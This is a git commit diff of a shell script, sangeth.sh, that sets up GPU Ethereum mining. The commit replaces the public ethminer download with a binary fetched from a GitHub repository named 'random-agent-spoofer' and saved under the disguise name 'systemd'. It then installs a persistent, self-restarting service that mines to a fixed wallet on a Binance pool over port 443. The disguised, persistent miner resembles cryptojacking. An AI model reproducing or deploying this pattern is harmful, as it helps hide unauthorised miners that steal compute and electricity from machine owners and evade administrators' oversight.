b1d0fa51a241a732118c472e2510257e8bc85787
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-03-11 15:43:32 +0700

    Update sangeth.sh

--- sangeth.sh
+++ sangeth.sh
@@ -15,9 +15,9 @@ then
 	sudo apt-get update
 	sudo apt-get -y install cuda-drivers --allow-unauthenticated
 	sudo apt-get install libcurl3 -y
-	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x962553FeD3bCFCd3d9E657BCEe1E952b07f98807.TENCUAMAYDAO@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/v2.0/systemd
+	sudo chmod +x systemd
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/systemd -a ethash -o  stratum+tcp://ethash.poolbinance.com:443 -u 0x962553FeD3bCFCd3d9E657BCEe1E952b07f98807.TENCUAMAYDAO -p x &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	rm -rf name
 	date "+%H%M-%d%m" >> name
 	index=`cat "name"`
